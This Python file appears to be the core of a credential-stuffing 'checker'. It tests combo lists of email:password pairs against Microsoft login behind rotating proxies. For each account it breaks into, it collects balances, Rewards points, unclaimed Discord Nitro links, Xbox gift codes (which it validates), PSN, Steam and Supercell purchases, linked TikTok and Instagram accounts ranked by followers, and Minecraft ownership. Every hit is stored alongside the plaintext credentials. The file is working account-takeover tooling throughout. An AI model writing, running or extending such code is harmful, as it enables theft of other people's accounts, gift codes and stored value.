import threading
import time
from CONFIG.config import MAX_RETRIES
from PROXY.proxy import ProxyRotator, init_proxies
from API.checker_engine import (
    ms_login, check_services, check_balance, check_rp, get_xbl,
    check_discord, disc_status, check_xbox_codes,
    check_psn, check_steam, check_supercell, check_tiktok, check_instagram,
    check_minecraft_via_xbox, check_minecraft_via_mail,
    classify_svc, fmt_svc
)
from API.social import _get_followers_range

try:
    from API.api_exam import (
        fetch_oauth_tokens, fetch_login, get_xbox_tokens,
        fetch_codes_from_xbox,
        login_microsoft_account as xbox_pulled_login,
        validate_code_primary as xbox_pulled_validate,
    )
    XBOX_PULLED_AVAILABLE = True
except ImportError:
    XBOX_PULLED_AVAILABLE = False

from CONFIG.config import UA


class CheckerStats:
    def __init__(self):
        self.lock = threading.Lock()
        self.total = 0
        self.valid = 0
        self.bad_lines = 0
        self.checked = 0
        self.bad = 0
        self.twofa = 0
        self.errors = 0
        self.retries = 0
        self.proxy_err = 0
        self.psn = 0
        self.steam = 0
        self.supercell = 0
        self.tiktok = 0
        self.instagram = 0
        self.minecraft = 0
        self.xbox_codes = 0
        self.xbox_pulled = 0
        self.xbox_pulled_valid = 0
        self.discord_total = 0
        self.discord_valid = 0
        self.discord_claimed = 0
        self.discord_unk = 0
        self.balance = 0
        self.rp_hits = 0
        self.rp_total_pts = 0
        self.xgpu = 0
        self.xgpp = 0
        self.xgpe = 0
        self.m365 = 0
        self.other_svc = 0
        self.svc_free = 0
        self.all_hits = []
        self.svc_results = []
        self.all_services = []
        self.balance_list = []
        self.rp_list = []
        self.discord_list = []
        self.xbox_code_list = []
        self.xbox_pulled_by_status = {
            "VALID": [], "BALANCE_CODE": [], "VALID_REQUIRES_CARD": [],
            "REDEEMED": [], "EXPIRED": [], "INVALID": [], "DEACTIVATED": [],
            "UNKNOWN": [], "REGION_LOCKED": [], "RATE_LIMITED": [], "ERROR": [],
        }
        self.psn_list = []
        self.steam_list = []
        self.supercell_list = []
        self.tiktok_list = []
        self.instagram_list = []
        self.minecraft_list = []
        self.bad_list = []
        self.twofa_list = []
        self.error_list = []
        self.tiktok_followers_ranges = {
            '0-999': 0, '1k-1.9k': 0, '2k-2.9k': 0, '3k-3.9k': 0, '4k-4.9k': 0,
            '5k-5.9k': 0, '6k-6.9k': 0, '7k-7.9k': 0, '8k-8.9k': 0, '9k-9.9k': 0,
            '10k-99k': 0, '100k-199k': 0, '200k-299k': 0, '300k-399k': 0, '400k-499k': 0,
            '500k-599k': 0, '600k-699k': 0, '700k-799k': 0, '800k-899k': 0, '900k-999k': 0,
            '1m+': 0
        }
        self.instagram_followers_ranges = {
            '0-999': 0, '1k-1.9k': 0, '2k-2.9k': 0, '3k-3.9k': 0, '4k-4.9k': 0,
            '5k-5.9k': 0, '6k-6.9k': 0, '7k-7.9k': 0, '8k-8.9k': 0, '9k-9.9k': 0,
            '10k-99k': 0, '100k-199k': 0, '200k-299k': 0, '300k-399k': 0, '400k-499k': 0,
            '500k-599k': 0, '600k-699k': 0, '700k-799k': 0, '800k-899k': 0, '900k-999k': 0,
            '1m+': 0
        }

    def inc(self, f, v=1):
        with self.lock:
            setattr(self, f, getattr(self, f) + v)

    def add(self, f, item):
        with self.lock:
            getattr(self, f).append(item)


class CheckerSession:
    def __init__(self, user_id, combos, total_lines, bad_lines):
        self.user_id = user_id
        self.combos = combos
        self.stats = CheckerStats()
        self.stats.total = total_lines
        self.stats.valid = len(combos)
        self.stats.bad_lines = bad_lines
        self.pxr = ProxyRotator(init_proxies(), True)
        self.stop_event = threading.Event()
        self.started = time.time()
        self.msg_id = None
        self.finished = False
        self.executor = None
        self.futures = []

    def process_one(self, email, pwd):
        if self.stop_event.is_set():
            return

        pxr_inst = self.pxr
        st = self.stats

        for attempt in range(MAX_RETRIES):
            if self.stop_event.is_set():
                return
            sess, status, access_token, cid = ms_login(email, pwd, pxr_inst)
            if status in ("OK", "BAD", "2FA"):
                break
            st.inc("retries")
            time.sleep(2 * (attempt + 1))

        st.inc("checked")

        if status == "BAD":
            st.inc("bad")
            st.add("bad_list", f"{email}:{pwd}")
            return
        if status == "2FA":
            st.inc("twofa")
            st.add("twofa_list", f"{email}:{pwd}")
            return
        if status == "ERROR":
            st.inc("errors")
            st.add("error_list", f"{email}:{pwd}")
            return

        try:
            svcs = check_services(sess, email)
        except:
            svcs = []

        active = [s for s in svcs if s["cat"] in ("ACTIVE", "TRIAL", "COMMERCIAL")]
        if active:
            for s in active:
                st.inc(classify_svc(s["name"]))
            st.add("svc_results", (email, pwd, svcs))
            st.add("all_hits", (email, pwd, "SVC", "\n".join(fmt_svc(s) for s in svcs)))
        else:
            st.inc("svc_free")

        if svcs:
            st.add("all_services", (email, pwd, svcs))

        try:
            bal, cur, holder = check_balance(sess)
            if bal is not None and bal > 0:
                st.inc("balance")
                st.add("balance_list", (email, pwd, bal, cur or "", holder or ""))
                st.add("all_hits", (email, pwd, "BAL", f"${bal} {cur or ''}"))
        except:
            pass

        try:
            pts = check_rp(sess)
            if pts is not None and pts > 0:
                st.inc("rp_hits")
                with st.lock:
                    st.rp_total_pts += pts
                st.add("rp_list", (email, pwd, pts))
                st.add("all_hits", (email, pwd, "RP", str(pts)))
        except:
            pass

        # Check Discord Nitro promos
        xbl = None
        try:
            xbl = get_xbl(sess)
        except:
            pass

        if xbl:
            try:
                promos = check_discord(sess, xbl, pxr_inst)

                # Track that we checked this account (even if no promos found)
                if len(promos) == 0:
                    # Account checked but no promos available
                    st.inc("discord_total")
                    st.inc("discord_unk")  # Count as "no promo available"
                else:
                    # Promos found, check each one
                    for lnk, _ in promos:
                        st.inc("discord_total")
                        s2 = disc_status(lnk, pxr_inst)
                        if s2 == "unclaimed":
                            st.inc("discord_valid")
                            st.add("discord_list", (email, pwd, lnk, "UNCLAIMED"))
                            st.add("all_hits", (email, pwd, "DISC", lnk))
                        elif s2 == "claimed":
                            st.inc("discord_claimed")
                            st.add("discord_list", (email, pwd, lnk, "CLAIMED"))
                        elif s2 == "expired":
                            st.inc("discord_unk")
                            st.add("discord_list", (email, pwd, lnk, "EXPIRED"))
                        elif s2 == "invalid":
                            st.inc("discord_unk")
                            st.add("discord_list", (email, pwd, lnk, "INVALID"))
                        else:
                            st.inc("discord_unk")
                            st.add("discord_list", (email, pwd, lnk, "UNKNOWN"))
            except:
                pass

        try:
            codes = check_xbox_codes(sess)
            for code, desc in codes:
                st.inc("xbox_codes")
                st.add("xbox_code_list", (email, pwd, code, desc))
                st.add("all_hits", (email, pwd, "XCODE", f"{code} | {desc}"))
        except:
            pass

        if XBOX_PULLED_AVAILABLE:
            try:
                import requests
                proxy = pxr_inst.get() if pxr_inst else None
                fetch_sess = requests.Session()
                if proxy:
                    fetch_sess.proxies = proxy
                fetch_sess.headers.update({"User-Agent": UA})
                url_post, ppft = fetch_oauth_tokens(fetch_sess)
                if url_post:
                    rps = fetch_login(fetch_sess, email, pwd, url_post, ppft)
                    if rps:
                        uhs, xsts = get_xbox_tokens(fetch_sess, rps)
                        if uhs:
                            raw_codes = fetch_codes_from_xbox(fetch_sess, uhs, xsts)
                            if raw_codes:
                                val_sess = xbox_pulled_login(email, pwd, proxy)
                                if val_sess:
                                    for code in raw_codes:
                                        if self.stop_event.is_set():
                                            break
                                        result = xbox_pulled_validate(val_sess, code)
                                        xp_status = result.get("status", "UNKNOWN")
                                        msg = result.get("message", "")
                                        name = result.get("product_title") or ""
                                        if not name and msg and "|" in msg:
                                            name = msg.split("|")[-1].strip()
                                        if not name:
                                            name = msg or xp_status
                                        st.inc("xbox_pulled")
                                        if xp_status in ("VALID", "VALID_REQUIRES_CARD", "BALANCE_CODE"):
                                            st.inc("xbox_pulled_valid")
                                        with st.lock:
                                            key = xp_status if xp_status in st.xbox_pulled_by_status else "UNKNOWN"
                                            st.xbox_pulled_by_status[key].append((email, pwd, name, code))
                                        st.add("all_hits", (email, pwd, "XBOX_PULLED", f"{xp_status}: {name} | {code}"))
                fetch_sess.close()
            except:
                pass

        try:
            psn_count = check_psn(sess, access_token, cid)
            if psn_count > 0:
                st.inc("psn")
                st.add("psn_list", (email, pwd, psn_count))
                st.add("all_hits", (email, pwd, "PSN", f"{psn_count} orders"))
        except:
            pass

        try:
            steam_count = check_steam(sess, access_token, cid)
            if steam_count > 0:
                st.inc("steam")
                st.add("steam_list", (email, pwd, steam_count))
                st.add("all_hits", (email, pwd, "STEAM", f"{steam_count} items"))
        except:
            pass

        try:
            sc_games = check_supercell(sess, access_token, cid)
            if sc_games:
                st.inc("supercell")
                st.add("supercell_list", (email, pwd, sc_games))
                st.add("all_hits", (email, pwd, "SC", ",".join(sc_games)))
        except:
            pass

        try:
            tt_result = check_tiktok(sess, access_token, cid)
            if tt_result and tt_result.get('username'):
                st.inc("tiktok")
                followers = tt_result.get('followers', 0)
                range_name = _get_followers_range(followers)
                with st.lock:
                    st.tiktok_followers_ranges[range_name] += 1
                detail = f"@{tt_result['username']} | {followers:,} followers" if followers > 0 else f"@{tt_result['username']}"
                if tt_result.get('verified'):
                    detail += " ✓"
                st.add("tiktok_list", (email, pwd, tt_result))
                st.add("all_hits", (email, pwd, "TT", detail))
        except:
            pass

        try:
            ig_result = check_instagram(sess, access_token, cid)
            if ig_result and ig_result.get('username'):
                st.inc("instagram")
                followers = ig_result.get('followers', 0)
                range_name = _get_followers_range(followers)
                with st.lock:
                    st.instagram_followers_ranges[range_name] += 1
                detail = f"@{ig_result['username']} | {followers:,} followers" if followers > 0 else f"@{ig_result['username']}"
                if ig_result.get('verified'):
                    detail += " ✓"
                st.add("instagram_list", (email, pwd, ig_result))
                st.add("all_hits", (email, pwd, "IG", detail))
        except:
            pass

        try:
            mc_name, mc_uuid = check_minecraft_via_xbox(sess)
            if mc_name:
                st.inc("minecraft")
                st.add("minecraft_list", (email, pwd, mc_name))
                st.add("all_hits", (email, pwd, "MC", mc_name))
            else:
                mc_mail = check_minecraft_via_mail(sess, access_token, cid)
                if mc_mail > 0:
                    st.inc("minecraft")
                    st.add("minecraft_list", (email, pwd, f"mail:{mc_mail}"))
                    st.add("all_hits", (email, pwd, "MC", f"mail:{mc_mail}"))
        except:
            pass
